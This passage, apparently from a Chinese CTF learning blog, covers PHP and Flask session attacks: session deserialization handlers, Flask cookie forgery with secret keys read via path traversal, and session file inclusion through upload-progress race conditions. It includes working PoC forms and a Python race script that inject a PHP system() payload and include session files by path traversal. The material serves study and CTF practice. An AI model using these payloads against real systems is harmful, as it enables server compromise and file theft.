</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png" alt="image-20230316143103687" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png?size=large 2x" data-title="image-20230316143103687" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>C|s:8:&ldquo;flag.php&rdquo;;</p>
</li>
<li>
<p>php_binary</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php_binary&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;sessionsessionsessionsessionsession&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><code>#</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:&quot;xianzhi&quot;;</code>为传入 GET 参数经过序列化后的值</p>
<p><img loading="lazy" src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20230316143333179.png" alt="image-20230316143333179" srcset="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20230316143333179.png?size=small, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20230316143333179.png?size=medium 1.5x, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20230316143333179.png?size=large 2x" data-title="image-20230316143333179" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
<li>
<p>php_serialize</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php_serialize&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;session&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png" alt="image-20230316143510975" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png?size=large 2x" data-title="image-20230316143510975" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
</ul>
<p><code>上传进度支持（session.upload_progress）</code></p>
<blockquote>
<p>当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。</p>
</blockquote>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png" alt="image-20230316163338518" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png?size=large 2x" data-title="image-20230316163338518" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>poc</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">head</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#58a1dd">title</span>&gt;A_dmin&lt;/<span style="color:#58a1dd">title</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#58a1dd">meta</span> <span style="color:#58a1dd">charset</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">body</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#58a1dd">form</span> <span style="color:#58a1dd">action</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;http://web.jarvisoj.com:32784/index.php&#34;</span> <span style="color:#58a1dd">method</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;POST&#34;</span> <span style="color:#58a1dd">enctype</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;multipart/form-data&#34;</span>&gt;
</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;hidden&#34;</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;123&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;file&#34;</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;file&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;submit&#34;</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;submit&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#58a1dd">form</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">html</span>&gt;</span></span></code></pre></div><p>抓包修改，在序列化的字符串前加 |，提交即可。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png" alt="image-20230316171920324" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=large 2x" data-title="image-20230316171920324" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="利用2session伪造" class="heading-element"><span>利用2：session伪造</span>
  <a href="#%e5%88%a9%e7%94%a82session%e4%bc%aa%e9%80%a0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这一块一直不咋熟悉，貌似在flask中session伪造比较多，学一下</p>
<blockquote>
<p>并不是所有语言都有像php那样的的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。</p>
<p>因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。</p>
</blockquote>
<p><strong>flask</strong> 的 <strong>session</strong> 机制：<a href="http://cizixs.com/2017/03/08/flask-insight-session/"target="_blank" rel="external nofollow noopener noreferrer">flask 源码解析：session</a></p>
<p>客户端 <strong>session</strong>问题：<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html"target="_blank" rel="external nofollow noopener noreferrer">客户端 session 导致的安全问题</a></p>
<p>flask仅对 <strong>session</strong> 进行了签名，按照flask对session的处理，如果我们拿不到secret_key也就无法伪造session</p>
<p>此外众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题，比如敏感信息泄露。</p>
<p><code>flask解密脚本</code></p>
<p>通过这个脚本解密处 <strong>session</strong> ，我们就可以大概知道 <strong>session</strong> 中存储着哪些基本信息。然后我们可以通过其他漏洞获取用于签名认证的 <strong>secret_key</strong> ，进而伪造任意用户身份，扩大攻击效果。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">sys</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">zlib</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">base64</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">b64decode</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">flask.sessions</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">session_json_serializer</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">itsdangerous</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">base64_decode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">decryption</span>(<span style="color:#58a1dd">payload</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">payload</span>, <span style="color:#58a1dd">sig</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">rsplit</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;.&#39;</span>, <span style="color:#a6be9d">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">payload</span>, <span style="color:#58a1dd">timestamp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">rsplit</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;.&#39;</span>, <span style="color:#a6be9d">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">decompress</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">payload</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">startswith</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">payload</span>[<span style="color:#a6be9d">1</span>:]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">decompress</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">base64_decode</span>(<span style="color:#58a1dd">payload</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#39;Could not base64 decode the payload because of &#39;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6be9d">&#39;an exception&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#58a1dd">decompress</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">payload</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">zlib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decompress</span>(<span style="color:#58a1dd">payload</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">except</span> <span style="color:#58a1dd">Exception</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">e</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">raise</span> <span style="color:#58a1dd">Exception</span>(<span style="color:#a6be9d">&#39;Could not zlib decompress the payload before &#39;</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#a6be9d">&#39;decoding the payload&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">session_json_serializer</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">payload</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">decryption</span>(<span style="color:#a6be9d">&#34;eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XyZ3Vw.OcD3-l1yOcq8vlg8g4Ww3FxrhVs&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">encode</span>()))</span></span></code></pre></div><p><code>flask加密脚本</code></p>
<p><a href="https://github.com/noraj/flask-session-cookie-manager"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/noraj/flask-session-cookie-manager</a></p>
<blockquote>
<p>注意，编码一定需要加密的key的，需要去找这个key，可能在环境变量里面</p>
<p>/proc/self
// 其路径指向当前进程</p>
<p>/environ
// 记录当前进程的环境变量信息</p>
<p>当路径为<code>../../proc/self/environ</code>时，得到环境变量回显（这里存在任意文件读取）</p>
</blockquote>
<ul>
<li>
<p><code>编码</code></p>
<blockquote>
<p>python3 flask_session_cookie_manager3.py encode -s &ldquo;woshicaiji&rdquo; -t &ldquo;{&lsquo;username&rsquo;: b&rsquo;admin&rsquo;}&rdquo;</p>
<p>usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <!-- raw HTML omitted --> -t <!-- raw HTML omitted --></p>
<p>optional arguments:
-h, &ndash;help            show this help message and exit
-s <!-- raw HTML omitted -->, &ndash;secret-key <!-- raw HTML omitted -->
Secret key
-t <!-- raw HTML omitted -->, &ndash;cookie-structure <!-- raw HTML omitted -->
Session cookie structure</p>
</blockquote>
</li>
<li>
<p><code>解码</code></p>
<blockquote>
<p>python3 ./flask_session_cookie_manager3.py decode -c &ldquo;.eJw9kE2LwjAURf_K8NYuajqzEVwIsaXCS1FiQ7IRdWrz0ThDW6mN-N8nOODqLe7hXO57wOHS1b2GxdDd6hkczDcsHvBxggWg3afIi7u05wnJNjCSOZVnjuWVRt46DNpJIe-KKqf4NjKSSK4Ns-cRvYrcRjO6JyVtDYZiYl4GJJmJ1BxtcS8FkngnyXFUNjMql1_SrlImMJT0RaeRmLO8-FTcTcpiUvKdVnRN0FemzCPDWx37lvCcwbnvLofhx9XX9wTpN7YUqmWxUorKKrsakTdBBu2V2BhGK8dEnCiimq5TZldENsuXzvhjU79Nu-SX7sf_5Hr0MYCh7geYwa2vu9fbYJ7A8w-kYW1v.Xj-tXQ.GmXzuYTP0IobbVCyI-9xVsc5C5A&rdquo; -s ckj123</p>
<p>usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s <!-- raw HTML omitted -->] -c <!-- raw HTML omitted --></p>
<p>optional arguments:
-h, &ndash;help            show this help message and exit
-s <!-- raw HTML omitted -->, &ndash;secret-key <!-- raw HTML omitted -->
Secret key
-c <!-- raw HTML omitted -->, &ndash;cookie-value <!-- raw HTML omitted -->
Session cookie value</p>
</blockquote>
</li>
</ul>
<p><code>2018HCTF WEB admin(session伪造、unicode漏洞、条件竞争)</code></p>
<p><a href="https://www.cnblogs.com/xhds/p/12287085.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/xhds/p/12287085.html</a></p>
<h2 id="利用3session包含" class="heading-element"><span>利用3：session包含</span>
  <a href="#%e5%88%a9%e7%94%a83session%e5%8c%85%e5%90%ab" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong><code>php.ini有关session的重要配置项</code></strong></p>
<blockquote>
<ul>
<li>
<p>session.upload_progress.enabled = on 表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
</li>
<li>
<p>session.upload_progress.prefix = &ldquo;upload_progress_&rdquo; //将表示为session中的键名</p>
</li>
<li>
<p>session.upload_progress.name = &ldquo;PHP_SESSION_UPLOAD_PROGRESS&rdquo; //当它出现在表单中，php将会报告上传进度，而且==它的值可控==！！！(shell内容)</p>
</li>
<li>
<p>session.use_strict_mode = off //这个选项默认值为off，表示我们对==Cookie中sessionid可控==！！！(shell名字)</p>
</li>
<li>
<p>session.save_path = /var/lib/php/sessions //session的存贮位置，默认还有一个 /tmp/目录</p>
</li>
</ul>
</blockquote>
<p>平常，当我们要创建session时往往会在php代码里写<code>session_start()</code>，但我们不写的话，也是可以创建的。</p>
<p>比如，在php.ini中设置<code>session.auto_start=On</code> 的情况下，php在接收请求的时候会自动初始化session，不需要执行<code>session_start()</code>。但默认状态下，这个选项是默认关闭的。</p>
<p>不过幸好，session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。</p>
<p>这样用户是可以自己定义session ID的。比如，我们在cookie里设置PHPSESSID=MUNG29，就会在服务器<code>/tmp</code>目录下或者<code>/var/lib/php/sessions/</code>目录下创建一个文件：sess_MUNG29。即便没有设置自动初始化session，php也会产生session，并生成一个键值，这个键值由<code>ini.get(&quot;session.upload_progress.prefix&quot;)</code>+我们构造的<code>session.upload_progress.name</code>值组成，最后被一起写入sess_文件里。</p>
<blockquote>
<p>如果没做过设置，session文件默认是在/var/lib/php/sessions/目录下，文件名是sess_加上你的sessionID字段。（没有权限）
而一般情况下，phpmyadmin的session文件会设置在/tmp目录下，需要在php.ini里把session.auto_start置为1，把session.save_path目录设置为/tmp。</p>
<p>默认路径</p>
<pre tabindex="0"><code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID</code></pre></blockquote>
<p>POC</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">form</span> <span style="color:#58a1dd">action</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;http://localhost/index.php&#34;</span> <span style="color:#58a1dd">method</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;POST&#34;</span> <span style="color:#58a1dd">enctype</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;multipart/form-data&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;hidden&#34;</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&lt;?php system(&#39;cat flag.php&#39;);?&gt;&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;file&#34;</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;file&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;submit&#34;</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;submit&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">form</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">html</span>&gt;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PYTHON" data-lang="PYTHON"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">io</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">sys</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">requests</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">threading</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sessid</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;mung29&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">WRITE</span>(<span style="color:#58a1dd">session</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> <span style="color:#ff636f">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">f</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">io</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">BytesIO</span>(<span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;a&#39;</span> <span style="color:#ff636f">*</span> <span style="color:#a6be9d">1024</span> <span style="color:#ff636f">*</span> <span style="color:#a6be9d">50</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">session</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#a6be9d">&#39;http://localhost/index.php&#39;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">data</span><span style="color:#ff636f">=</span>{<span style="color:#a6be9d">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span>:<span style="color:#a6be9d">&#34;&lt;?php system(&#39;cat flag.php&#39;);?&gt;&#34;</span>},
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">files</span><span style="color:#ff636f">=</span>{<span style="color:#a6be9d">&#34;file&#34;</span>:(<span style="color:#a6be9d">&#39;1.txt&#39;</span>, <span style="color:#58a1dd">f</span>)},
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">cookies</span><span style="color:#ff636f">=</span>{<span style="color:#a6be9d">&#39;PHPSESSID&#39;</span>:<span style="color:#58a1dd">sessid</span>}
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">READ</span>(<span style="color:#58a1dd">session</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">while</span> <span style="color:#ff636f">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">resp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">session</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">f</span><span style="color:#a6be9d">&#39;http://localhost/index.php/?file=../../../../../../../../tmp/sess_</span><span style="color:#a6be9d">{</span><span style="color:#58a1dd">sessid</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> <span style="color:#a6be9d">&#39;flag{&#39;</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">resp</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">resp</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">text</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">sys</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exit</span>(<span style="color:#a6be9d">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#39;Thinking[+++++++]&#39;</span>)
</span></span><span style="display:flex;"><span>
